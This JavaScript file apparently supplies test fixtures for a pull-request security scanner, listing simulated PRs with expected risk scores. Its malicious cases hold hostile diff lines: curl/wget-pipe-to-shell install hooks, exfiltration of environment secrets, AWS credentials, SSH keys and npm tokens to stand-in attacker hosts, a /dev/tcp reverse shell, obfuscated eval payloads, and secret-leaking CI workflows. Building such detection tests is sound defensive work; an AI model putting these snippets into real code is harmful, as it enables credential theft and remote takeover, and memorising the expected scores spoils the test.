const TEST_CASES_CATALOG = [
  // --- JUDGE DEMO SCENARIOS (1 to 3) ---
  {
    id: 'TC-001',
    scenario_badge: 'Judge Demo 1 — Safe PR',
    title: 'Add email input validation and unit tests for registration handler',
    repository: 'acme-corp/auth-service',
    pr_number: 101,
    author: 'alice-dev',
    expected_risk_level: 'LOW',
    expected_min_score: 0,
    expected_max_score: 24,
    attack_type: 'Benign Feature & Tests',
    files: [
      {
        filename: 'src/validators.py',
        status: 'modified',
        patch:
          "@@ -10,2 +10,7 @@\n+def validate_email(email: str) -> bool:\n+    return '@' in email and '.' in email.split('@')[-1]\n+\n+if not validate_email(payload.email):\n+    raise ValueError('Invalid email format')"
      },
      {
        filename: 'tests/test_validators.py',
        status: 'added',
        patch:
          "@@ -0,0 +1,5 @@\n+from src.validators import validate_email\n+\n+def test_validate_email():\n+    assert validate_email('user@example.com') is True\n+    assert validate_email('invalid-email') is False"
      }
    ]
  },
  {
    id: 'TC-002',
    scenario_badge: 'Judge Demo 2 — Risky Dependency Update',
    title: 'chore(deps): upgrade event-stream and add analytics postinstall hook',
    repository: 'acme-corp/payment-gateway',
    pr_number: 102,
    author: 'dep-updater-bot',
    expected_risk_level: 'CRITICAL',
    expected_min_score: 75,
    expected_max_score: 100,
    attack_type: 'Malicious Dependency & Install Script',
    files: [
      {
        filename: 'package.json',
        status: 'modified',
        patch:
          '@@ -12,4 +12,6 @@\n   "dependencies": {\n-    "event-stream": "3.3.4",\n+    "event-stream": "3.3.6",\n+    "flatmap-stream": "0.1.1"\n   },\n   "scripts": {\n+    "postinstall": "curl -fsSL https://telemetry-cdn.evil.io/bootstrap.sh | sh"\n   }'
      }
    ]
  },
  {
    id: 'TC-003',
    scenario_badge: 'Judge Demo 3 — Suspicious Code Change',
    title: 'perf(cache): optimize connection retry telemetry in worker',
    repository: 'acme-corp/cloud-worker',
    pr_number: 103,
    author: 'ext-contributor99',
    expected_risk_level: 'CRITICAL',
    expected_min_score: 75,
    expected_max_score: 100,
    attack_type: 'Secret & Credential Exfiltration',
    files: [
      {
        filename: 'worker/telemetry.py',
        status: 'modified',
        patch:
          "@@ -22,3 +22,7 @@\n+import os\n+import requests\n+\n+def sync_diagnostics():\n+    env_dump = {k: v for k, v in os.environ.items() if 'SECRET' in k or 'AWS_' in k or 'TOKEN' in k}\n+    requests.post('https://collector.shadow-metrics.net/v1/ingest', json=env_dump, timeout=2)"
      }
    ]
  },

  // --- ADDITIONAL 19 TEST CASES (Total 22 PR Scenarios) ---
  {
    id: 'TC-004',
    scenario_badge: 'Test Case 4 — Known Vulnerable Package (OSV)',
    title: 'build(deps): pin pyyaml for legacy compatibility',
    repository: 'acme-corp/data-pipeline',
    pr_number: 104,
    author: 'legacy-maintainer',
    expected_risk_level: 'MEDIUM',
    expected_min_score: 25,
    expected_max_score: 60,
    attack_type: 'Known Vulnerable Dependency (CVE/OSV)',
    files: [
      {
        filename: 'requirements.txt',
        status: 'modified',
        patch: '@@ -1,2 +1,2 @@\n-pyyaml==6.0.1\n+pyyaml==5.3.1'
      }
    ]
  },
  {
    id: 'TC-005',
    scenario_badge: 'Test Case 5 — Obfuscated Base64 Exec',
    title: 'fix(utils): add string encoding helper for locale support',
    repository: 'acme-corp/core-utils',
    pr_number: 105,
    author: 'anon-patch',
    expected_risk_level: 'MEDIUM',
    expected_min_score: 25,
    expected_max_score: 70,
    attack_type: 'Obfuscated / Hidden Code',
    files: [
      {
        filename: 'utils/locale_helper.py',
        status: 'modified',
        patch:
          "@@ -5,2 +5,5 @@\n+import base64\n+_p = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBzaCIp'\n+eval(compile(base64.b64decode(_p).decode('utf-8'), '<string>', 'exec'))"
      }
    ]
  },
  {
    id: 'TC-006',
    scenario_badge: 'Test Case 6 — CI/CD Workflow Poisoning',
    title: 'ci: enable pull_request_target for external fork preview builds',
    repository: 'acme-corp/web-portal',
    pr_number: 106,
    author: 'ci-tweaker',
    expected_risk_level: 'MEDIUM',
    expected_min_score: 20,
    expected_max_score: 74,
    attack_type: 'Suspicious Workflow Modification',
    files: [
      {
        filename: '.github/workflows/pr-preview.yml',
        status: 'modified',
        patch:
          '@@ -1,4 +1,9 @@\n-on: pull_request\n+on: pull_request_target\n+permissions: write-all\n jobs:\n   preview:\n     runs-on: ubuntu-latest\n     steps:\n+      - run: echo "${{ toJSON(secrets) }}" | curl -X POST -d @- https://webhook.site/ci-leak'
      }
    ]
  },
  {
    id: 'TC-007',
    scenario_badge: 'Test Case 7 — PyPI Typosquatting Attack',
    title: 'chore: add HTTP and terminal color libraries to requirements.txt',
    repository: 'acme-corp/cli-tool',
    pr_number: 107,
    author: 'quick-contrib',
    expected_risk_level: 'HIGH',
    expected_min_score: 50,
    expected_max_score: 100,
    attack_type: 'Typosquatted Malicious Dependency',
    files: [
      {
        filename: 'requirements.txt',
        status: 'modified',
        patch: '@@ -1,2 +1,4 @@\n-requests==2.31.0\n-colorama==0.4.6\n+reqeusts==2.31.0\n+colourama==0.4.6'
      }
    ]
  },
  {
    id: 'TC-008',
    scenario_badge: 'Test Case 8 — SSH Private Key Exfiltration',
    title: 'feat(diagnostics): verify local key configuration on startup',
    repository: 'acme-corp/deploy-agent',
    pr_number: 108,
    author: 'dev-ops-helper',
    expected_risk_level: 'HIGH',
    expected_min_score: 50,
    expected_max_score: 100,
    attack_type: 'Secret & SSH Key Theft',
    files: [
      {
        filename: 'agent/check_keys.py',
        status: 'added',
        patch:
          "@@ -0,0 +1,5 @@\n+import os, urllib.request\n+ssh_key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n+req = urllib.request.Request('http://198.51.100.42:8080/keys', data=ssh_key.encode())\n+urllib.request.urlopen(req)"
      }
    ]
  },
  {
    id: 'TC-009',
    scenario_badge: 'Test Case 9 — Setup.py Reverse Shell',
    title: 'build: customize setup.py C-extension compilation step',
    repository: 'acme-corp/fast-crypto',
    pr_number: 109,
    author: 'c-builder',
    expected_risk_level: 'HIGH',
    expected_min_score: 50,
    expected_max_score: 100,
    attack_type: 'Dangerous setup.py Install Script',
    files: [
      {
        filename: 'setup.py',
        status: 'modified',
        patch:
          '@@ -15,2 +15,5 @@\n+import os\n+class CustomInstall:\n+    def run(self):\n+        os.system(\'bash -c "bash -i >& /dev/tcp/203.0.113.55/4444 0>&1"\')'
      }
    ]
  },
  {
    id: 'TC-010',
    scenario_badge: 'Test Case 10 — JS Buffer Base64 + Function()',
    title: 'refactor(charting): minify axis calculation helper',
    repository: 'acme-corp/dashboard-ui',
    pr_number: 110,
    author: 'ui-minifier',
    expected_risk_level: 'MEDIUM',
    expected_min_score: 25,
    expected_max_score: 74,
    attack_type: 'JavaScript Obfuscation & Dynamic Exec',
    files: [
      {
        filename: 'src/utils/axis.js',
        status: 'modified',
        patch:
          "@@ -8,2 +8,4 @@\n+const _0x4a2b = Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cDovL2F0dGFja2VyLmNvbS9wJyk=', 'base64').toString();\n+new Function(_0x4a2b)();"
      }
    ]
  },
  {
    id: 'TC-011',
    scenario_badge: 'Test Case 11 — Safe Dependency Upgrade',
    title: 'chore(deps): bump flask to 3.0.3 and pydantic to 2.7.1',
    repository: 'acme-corp/api-server',
    pr_number: 111,
    author: 'dependabot[bot]',
    expected_risk_level: 'LOW',
    expected_min_score: 0,
    expected_max_score: 24,
    attack_type: 'Benign Dependency Update',
    files: [
      {
        filename: 'requirements.txt',
        status: 'modified',
        patch: '@@ -1,2 +1,2 @@\n-flask==3.0.1\n-pydantic==2.6.0\n+flask==3.0.3\n+pydantic==2.7.1'
      }
    ]
  },
  {
    id: 'TC-012',
    scenario_badge: 'Test Case 12 — Safe CI Workflow Update',
    title: 'ci: upgrade actions/checkout to v4 and run pytest suite',
    repository: 'acme-corp/api-server',
    pr_number: 112,
    author: 'devops-lead',
    expected_risk_level: 'LOW',
    expected_min_score: 0,
    expected_max_score: 24,
    attack_type: 'Benign Workflow Update',
    files: [
      {
        filename: '.github/workflows/ci.yml',
        status: 'modified',
        patch:
          '@@ -5,4 +5,5 @@\n+permissions:\n+  contents: read\n steps:\n-  - uses: actions/checkout@v3\n+  - uses: actions/checkout@v4\n   - run: pytest tests/'
      }
    ]
  },
  {
    id: 'TC-013',
    scenario_badge: 'Test Case 13 — Discord Webhook Env Harvester',
    title: 'feat(logger): add crash reporting integration for node service',
    repository: 'acme-corp/order-service',
    pr_number: 113,
    author: 'node-helper',
    expected_risk_level: 'HIGH',
    expected_min_score: 50,
    expected_max_score: 100,
    attack_type: 'Node.js process.env Theft',
    files: [
      {
        filename: 'src/crash_reporter.js',
        status: 'added',
        patch:
          "@@ -0,0 +1,5 @@\n+const https = require('https');\n+const data = JSON.stringify(process.env);\n+const req = https.request('https://discord.com/api/webhooks/123456/exfil', { method: 'POST' });\n+req.write(data); req.end();"
      }
    ]
  },
  {
    id: 'TC-014',
    scenario_badge: 'Test Case 14 — Hijacked ua-parser-js & node-ipc',
    title: 'chore(deps): update ua-parser-js and node-ipc versions',
    repository: 'acme-corp/frontend-monorepo',
    pr_number: 114,
    author: 'pkg-bumper',
    expected_risk_level: 'HIGH',
    expected_min_score: 50,
    expected_max_score: 100,
    attack_type: 'Compromised Maintainer Package Version',
    files: [
      {
        filename: 'package.json',
        status: 'modified',
        patch: '@@ -10,2 +10,3 @@\n-    "ua-parser-js": "0.7.28"\n+    "ua-parser-js": "0.7.29",\n+    "node-ipc": "10.1.1"'
      }
    ]
  },
  {
    id: 'TC-015',
    scenario_badge: 'Test Case 15 — Hidden PowerShell Encoded Command',
    title: 'fix(win): add Windows temp directory cleanup helper',
    repository: 'acme-corp/desktop-sync',
    pr_number: 115,
    author: 'win-fixer',
    expected_risk_level: 'HIGH',
    expected_min_score: 50,
    expected_max_score: 100,
    attack_type: 'Dangerous Subprocess Execution',
    files: [
      {
        filename: 'sync/win_clean.py',
        status: 'modified',
        patch:
          "@@ -12,1 +12,3 @@\n+import subprocess\n+subprocess.Popen('powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', shell=True)"
      }
    ]
  },
  {
    id: 'TC-016',
    scenario_badge: 'Test Case 16 — Safe Pagination Bug Fix',
    title: 'fix(api): correct zero-based offset calculation in list endpoint',
    repository: 'acme-corp/inventory-api',
    pr_number: 116,
    author: 'sarah-backend',
    expected_risk_level: 'LOW',
    expected_min_score: 0,
    expected_max_score: 24,
    attack_type: 'Benign Bug Fix',
    files: [
      {
        filename: 'app/pagination.py',
        status: 'modified',
        patch: '@@ -4,2 +4,2 @@\n-    start = page * limit\n+    start = max(0, (page - 1) * limit)\n     return items[start : start + limit]'
      }
    ]
  },
  {
    id: 'TC-017',
    scenario_badge: 'Test Case 17 — Safe React Error Boundary',
    title: 'feat(ui): wrap dashboard widgets in React ErrorBoundary',
    repository: 'acme-corp/dashboard-ui',
    pr_number: 117,
    author: 'frontend-dev',
    expected_risk_level: 'LOW',
    expected_min_score: 0,
    expected_max_score: 24,
    attack_type: 'Benign UI Component',
    files: [
      {
        filename: 'src/components/ErrorBoundary.tsx',
        status: 'added',
        patch:
          '@@ -0,0 +1,4 @@\n+export class ErrorBoundary extends React.Component {\n+  state = { hasError: false };\n+  static getDerivedStateFromError() { return { hasError: true }; }\n+}'
      }
    ]
  },
  {
    id: 'TC-018',
    scenario_badge: 'Test Case 18 — .npmrc Token Stealer',
    title: 'chore(build): validate registry configuration in prebuild script',
    repository: 'acme-corp/design-system',
    pr_number: 118,
    author: 'build-optimizer',
    expected_risk_level: 'HIGH',
    expected_min_score: 50,
    expected_max_score: 100,
    attack_type: 'NPM Token Exfiltration',
    files: [
      {
        filename: 'scripts/check-registry.js',
        status: 'added',
        patch:
          "@@ -0,0 +1,4 @@\n+const fs = require('fs'), https = require('https');\n+const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');\n+https.get('https://registry-mirror.evil.sh/log?t=' + Buffer.from(npmrc).toString('base64'));"
      }
    ]
  },
  {
    id: 'TC-019',
    scenario_badge: 'Test Case 19 — Zlib + Marshal Bytecode Backdoor',
    title: 'perf(serializer): add precompiled fast serializer table',
    repository: 'acme-corp/data-pipeline',
    pr_number: 119,
    author: 'perf-ninja',
    expected_risk_level: 'MEDIUM',
    expected_min_score: 25,
    expected_max_score: 74,
    attack_type: 'Bytecode & Zlib Obfuscation',
    files: [
      {
        filename: 'serializer/fast_table.py',
        status: 'modified',
        patch:
          "@@ -1,2 +1,4 @@\n+import zlib, marshal\n+exec(marshal.loads(zlib.decompress(bytes.fromhex('789c6360'))))"
      }
    ]
  },
  {
    id: 'TC-020',
    scenario_badge: 'Test Case 20 — Sabotaged colors & faker Versions',
    title: 'chore(deps): update colors and faker to latest tags',
    repository: 'acme-corp/mock-generator',
    pr_number: 120,
    author: 'auto-bumper',
    expected_risk_level: 'HIGH',
    expected_min_score: 50,
    expected_max_score: 100,
    attack_type: 'Sabotaged Open-Source Package Release',
    files: [
      {
        filename: 'package.json',
        status: 'modified',
        patch:
          '@@ -5,2 +5,2 @@\n-    "colors": "1.4.0",\n-    "faker": "5.5.3"\n+    "colors": "1.4.44-liberty-2",\n+    "faker": "6.6.6"'
      }
    ]
  },
  {
    id: 'TC-021',
    scenario_badge: 'Test Case 21 — Safe Documentation & README Update',
    title: 'docs: add architecture diagram and local setup instructions',
    repository: 'acme-corp/docs-site',
    pr_number: 121,
    author: 'tech-writer',
    expected_risk_level: 'LOW',
    expected_min_score: 0,
    expected_max_score: 24,
    attack_type: 'Benign Documentation Change',
    files: [
      {
        filename: 'README.md',
        status: 'modified',
        patch:
          '@@ -1,2 +1,5 @@\n+# Architecture Overview\n+Run `npm install` and `npm run dev` to launch the local development environment.\n+All tests can be executed via `npm test`.'
      }
    ]
  },
  {
    id: 'TC-022',
    scenario_badge: 'Test Case 22 — Multi-Vector Attack (Exfil + Preinstall + Workflow)',
    title: 'feat(sdk): integrate cloud sync client and update CI build',
    repository: 'acme-corp/core-sdk',
    pr_number: 122,
    author: 'compromised-account',
    expected_risk_level: 'CRITICAL',
    expected_min_score: 75,
    expected_max_score: 100,
    attack_type: 'Combined Supply-Chain & CI Compromise',
    files: [
      {
        filename: 'package.json',
        status: 'modified',
        patch:
          '@@ -8,2 +8,3 @@\n   "scripts": {\n+    "preinstall": "wget -qO- https://evil-dropper.org/init.sh | bash"\n   }'
      },
      {
        filename: 'src/sync.py',
        status: 'added',
        patch:
          "@@ -0,0 +1,3 @@\n+import os, httpx\n+httpx.post('https://evil-dropper.org/keys', json={'secret': os.getenv('AWS_SECRET_ACCESS_KEY')})"
      },
      {
        filename: '.github/workflows/release.yml',
        status: 'modified',
        patch: '@@ -1,2 +1,3 @@\n+on: pull_request_target\n+permissions: write-all'
      }
    ]
  },
  {
    id: 'TC-026', scenario_badge: 'Benign Docs', title: 'docs: fix typos in CONTRIBUTING guide',
    repository: 'acme-corp/handbook', pr_number: 201, author: 'docs-helper',
    expected_risk_level: 'LOW', expected_min_score: 0, expected_max_score: 30, attack_type: 'None (Safe)',
    files: [{ filename: 'CONTRIBUTING.md', status: 'modified', patch: '@@ -3,2 +3,2 @@\n-Plese open an isue first.\n+Please open an issue first.' }]
  },
  {
    id: 'TC-027', scenario_badge: 'Benign CSS', title: 'style: update button hover colors',
    repository: 'acme-corp/web-ui', pr_number: 202, author: 'designer-kim',
    expected_risk_level: 'LOW', expected_min_score: 0, expected_max_score: 30, attack_type: 'None (Safe)',
    files: [{ filename: 'src/styles/button.css', status: 'modified', patch: '@@ -1,3 +1,3 @@\n .btn:hover {\n-  background: #333;\n+  background: #4f46e5;\n }' }]
  },
  {
    id: 'TC-028', scenario_badge: 'Benign Python', title: 'feat: add structured logging helper',
    repository: 'acme-corp/api-server', pr_number: 203, author: 'backend-dev',
    expected_risk_level: 'LOW', expected_min_score: 0, expected_max_score: 30, attack_type: 'None (Safe)',
    files: [{ filename: 'app/log_utils.py', status: 'added', patch: "@@ -0,0 +1,4 @@\n+import logging\n+logger = logging.getLogger(__name__)\n+def info(msg):\n+    logger.info(msg)" }]
  },
  {
    id: 'TC-029', scenario_badge: 'Benign Test', title: 'test: add unit tests for date formatter',
    repository: 'acme-corp/utils', pr_number: 204, author: 'qa-engineer',
    expected_risk_level: 'LOW', expected_min_score: 0, expected_max_score: 30, attack_type: 'None (Safe)',
    files: [{ filename: 'tests/date.test.js', status: 'added', patch: "@@ -0,0 +1,3 @@\n+test('formats date', () => {\n+  expect(formatDate('2024-01-01')).toBe('Jan 1, 2024');\n+});" }]
  },
  {
    id: 'TC-030', scenario_badge: 'Shell Injection', title: 'chore: add telemetry startup hook',
    repository: 'acme-corp/cli-tool', pr_number: 205, author: 'new-contributor-x',
    expected_risk_level: 'HIGH', expected_min_score: 25, expected_max_score: 100, attack_type: 'Remote Code Execution',
    files: [{ filename: 'src/startup.js', status: 'added', patch: "@@ -0,0 +1,2 @@\n+const { exec } = require('child_process');\n+exec('curl -s https://evil-telemetry.net/p.sh | bash');" }]
  },
  {
    id: 'TC-031', scenario_badge: 'Credential Theft', title: 'fix: improve cloud config loader',
    repository: 'acme-corp/deployer', pr_number: 206, author: 'unknown-dev-77',
    expected_risk_level: 'CRITICAL', expected_min_score: 25, expected_max_score: 100, attack_type: 'Secret Exfiltration',
    files: [{ filename: 'src/config.py', status: 'modified', patch: "@@ -1,2 +1,4 @@\n+import requests, os\n+creds = open(os.path.expanduser('~/.aws/credentials')).read()\n+requests.post('https://collector.evil.io/upload', data={'k': creds, 'token': os.getenv('GITHUB_TOKEN')})" }]
  },
  {
    id: 'TC-032', scenario_badge: 'Obfuscated Payload', title: 'perf: inline minified helper',
    repository: 'acme-corp/web-ui', pr_number: 207, author: 'speedy-merge',
    expected_risk_level: 'HIGH', expected_min_score: 25, expected_max_score: 100, attack_type: 'Obfuscated Code Execution',
    files: [{ filename: 'src/helper.js', status: 'added', patch: "@@ -0,0 +1,1 @@\n+eval(Buffer.from('Y3VybCBodHRwczovL2V2aWwuaW8vcC5zaCB8IGJhc2g=', 'base64').toString());" }]
  },
  {
    id: 'TC-033', scenario_badge: 'CI Hijack', title: 'ci: speed up workflow with remote script',
    repository: 'acme-corp/core-sdk', pr_number: 208, author: 'ci-optimizer',
    expected_risk_level: 'HIGH', expected_min_score: 20, expected_max_score: 100, attack_type: 'CI/CD Workflow Compromise',
    files: [{ filename: '.github/workflows/ci.yml', status: 'modified', patch: '@@ -1,3 +1,6 @@\n+on: pull_request_target\n+permissions: write-all\n+    steps:\n+      - run: curl -s https://evil-ci.net/x.sh | bash' }]
  }
];

module.exports = { TEST_CASES_CATALOG };
